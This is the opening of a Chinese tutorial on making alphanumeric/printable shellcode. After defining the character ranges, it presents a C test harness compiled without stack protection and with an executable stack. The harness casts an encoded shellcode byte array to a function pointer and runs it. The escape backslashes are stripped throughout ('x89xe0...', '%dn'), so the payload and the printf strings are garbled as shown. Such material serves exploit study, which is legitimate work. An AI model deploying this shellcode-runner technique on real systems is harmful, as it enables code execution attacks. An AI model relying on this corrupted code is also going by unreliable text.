# 生成自己的Alphanumeric/Printable shellcode

## Alphanumeric与Printable

Alphanumeric是字符在`[A-Za-z0-9]`区间的，而Printable是字符的ascii码在(0x1f,0x7f)区间的。
shellcode测试代码：

```c++
    /*
    * $ gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
    */
    #include <stdio.h>
    #include <string.h>
    char shellcode[] = {
    "x89xe0xdbxd6xd9x70xf4x5ax4ax4ax4ax4ax4ax4ax4a"
    "x4ax4ax4ax4ax43x43x43x43x43x43x37x52x59x6ax41"
    "x58x50x30x41x30x41x6bx41x41x51x32x41x42x32x42"
    "x42x30x42x42x41x42x58x50x38x41x42x75x4ax49x50"
    "x6ax66x6bx53x68x4fx69x62x72x73x56x42x48x46x4d"
    "x53x53x4bx39x49x77x51x78x34x6fx44x33x52x48x45"
    "x50x72x48x74x6fx50x62x33x59x72x4ex6cx49x38x63"
    "x70x52x38x68x55x53x67x70x35x50x65x50x74x33x45"
    "x38x35x50x50x57x72x73x6fx79x58x61x5ax6dx6fx70"
    "x41x41"
    };
    int main()
    {
        printf("Shellcode Length:  %dn",(int)strlen(shellcode));
        printf("Shellcode is [%s]n", shellcode);
        int (*ret)() = (int(*)())shellcode;
        ret();
        return 0;
    }
```
